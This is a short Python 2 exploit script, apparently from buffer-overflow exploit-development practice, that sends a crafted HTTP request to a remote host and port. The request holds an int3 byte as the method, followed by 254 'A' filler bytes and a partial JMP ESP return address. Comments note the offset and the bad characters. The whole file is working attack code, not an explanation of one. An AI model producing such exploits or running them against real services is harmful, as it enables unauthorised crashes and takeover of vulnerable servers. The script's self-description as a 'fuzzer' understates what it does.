#!/usr/bin/python

import argparse
import sys
import socket

parser = argparse.ArgumentParser("Simple fuzzer for buffer overflow exploits")

parser.add_argument(action='store', dest='rhost', type=str, help='remote host')
parser.add_argument(action='store', type=int, dest='rport', help='remote port')

ap = parser.parse_args()
print("Sending exploit to " + ap.rhost + " " + str(ap.rport))

offset_srp = 254
# 00401D09  |. 5D             POP EBP

ptr_jmp_esp = '\x09\x1D\x40'
# ptr_jmp_esp = struct.pack('<I', 0x401D09)
buf_len = 1000
http_method = '\xCC'
# badchars = [0x00, 0x0A, 0x0D]
# [*] Exact match at offset 254

buf = '\x41' * offset_srp
buf += ptr_jmp_esp

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((ap.rhost, ap.rport))
    sent = s.send(http_method + ' /%' + buf + "\r\n\r\n")
    data = s.recv(1024)
    print("Sent buffer length " + str(len(buf)))
    s.close()
except Exception:
    print("[+] Check for crash in debugger.")
    sys.exit()
